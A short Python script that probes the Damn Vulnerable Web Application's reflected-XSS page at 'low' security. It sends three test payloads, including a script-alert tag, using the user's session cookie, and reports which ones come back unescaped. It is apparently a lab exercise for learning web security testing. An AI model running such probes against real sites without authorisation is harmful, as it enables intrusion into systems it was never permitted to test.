import requests

# This header for authentication
PHPSESSID = ""  # Type the your PHPSESSID
DVWA_IP = ""  # Type the DVWA IP on your local machine
header = {
    "Cookie": "security=low; PHPSESSID={}".format(PHPSESSID)
}
xss_list = ["cyber", "<h1>cyber</h1>", "<script>alert('cyber')</script>"]
for payload in xss_list:
    url = "http://{}/DVWA/vulnerabilities/xss_r/?name=".format(DVWA_IP) + str(payload)
    res = requests.get(url=url, headers=header)
    if str(payload) in str(res.content):
        print("Probably there's XSS : ", str(payload))
